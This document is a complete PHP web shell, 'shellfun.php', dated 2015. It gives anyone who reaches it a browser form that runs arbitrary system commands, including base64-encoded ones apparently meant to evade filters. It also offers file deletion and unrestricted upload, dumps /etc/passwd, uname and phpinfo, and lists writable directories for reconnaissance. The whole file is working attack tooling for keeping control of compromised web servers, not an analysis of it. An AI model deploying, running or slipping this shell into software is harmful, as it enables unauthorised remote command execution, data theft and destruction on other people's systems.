<?php

// shellfun.php
// WSTN
// 2015-05-13


//@error_reporting(0);


// run system commands
echo <<<EOD
<strong>shell command</strong><br><br>
  <form action="" method="post">
  <input type="text" name="sys_cmd">
  <input type="submit" name="sub_cmd" value="system cmd">
</form>
EOD;

echo '<pre>';
$b64_regex = '#^[A-Za-z0-9+/]+={0,2}$#';
if (isset($_POST['sys_cmd'])) {
    if (preg_match($b64_regex, $_POST['sys_cmd'])) {
        system(base64_decode($_POST['sys_cmd']));
    } else {
        system($_POST['sys_cmd']);
    }
}
echo '</pre><br><hr><br>';


// file manager
echo '<strong>file manager</strong><br><br>';
echo '<form action="" method="post">';
echo '  <input type="text" name="ls_path" value="'.getcwd().'">';
echo '  <input type="submit" name="ls_dir" value="ls dir">';
echo '</form>';
if (isset($_POST['ls_path'])) {
    $ls_path = $_POST['ls_path'];
    $files = scandir($ls_path);
    echo 'ls of '.htmlentities($ls_path).'<br><br>';
    echo '<form action="" method="post"><table>';
    for ($i=0; $i < count($files); $i++) {
        if ($files[$i] != '.' && $files[$i] != '..' ) {
            if (is_dir("$ls_path/$files[$i]")) {
                echo '<tr><td><input type="checkbox" name="file_delete[]" value="'.$files[$i].'"><font color="blue">'.$files[$i].'</font></td></tr>';
            } else {
                echo '<tr><td><input type="checkbox" name="file_delete[]" value="'.$files[$i].'">'.$files[$i].'</td></tr>';
            }
        }
    }
}

echo '</table><br><input type="submit" name="delete_button" value="file delete"></form><br><br>';

if (isset($_POST['delete_button'])) {
    foreach ($_POST['file_delete'] as $deleted) {
        unlink($deleted);
        echo '<br>'.htmlentities($deleted).' deleted<br>';
    }
}

echo '<hr><br>';


// file upload
echo <<<EOD
<strong>file upload</strong><br><br>
<form enctype="multipart/form-data" action="" method="post">
  <label>target path</label><br>
EOD;
echo '  <input type="text" name="target_path" value="'.getcwd().'">';
echo <<<EOD
  <input type="file" name="file_upload">
  <input type="submit" name="upload" value="Upload">
</form>
EOD;

if (isset($_POST['target_path']) && isset($_FILES['file_upload']['name'])) {
    $target_file = $_POST['target_path'].'/'.$_FILES['file_upload']['name'];
}

if (isset($_POST['upload'])) {
    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $target_file)) {
        echo 'file uploaded: ' . htmlentities($target_file);
    } else {
        echo 'upload error';
    }
}


// function buttons
echo '<br><hr><br><strong>functions</strong><br><br>';

// uname
echo <<<EOD
<form action="" method="post">
  <button type="submit" name="uname_button">uname</button>
</form><br>
EOD;

if (isset($_POST['uname_button'])) {
    echo '<pre>';
    echo php_uname();
    echo '</pre><br><br>';
}

// /etc/passwd
echo <<<EOD
<form action="" method="post">
  <button type="submit" name="passwd_button">/etc/passwd</button>
</form><br>
EOD;

if (isset($_POST['passwd_button'])) {
    $etc_passwd = shell_exec('cat /etc/passwd');
    echo '<pre>';
    echo $etc_passwd;
    echo '</pre><br><br>';
}

// find writable dirs
echo <<<EOD
<form action="" method="post">
  <button type="submit" name="writedirs_button">writable dirs</button>
</form><br>
EOD;

if (isset($_POST['writedirs_button'])) {
    $path = getcwd();
    $dirs = new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS);
    foreach ($dirs as $dir) {
        if (is_dir($dir) && is_writable($dir)) {
            echo $dir . '<br>';
        }
    }
    echo '<br><br>';
}

// phpinfo()
echo <<<EOD
<form action="" method="post">
  <button type="submit" name="phpinfo_button">phpinfo()</button>
</form><br>
EOD;

if (isset($_POST['phpinfo_button'])) {
    phpinfo();
}

?>
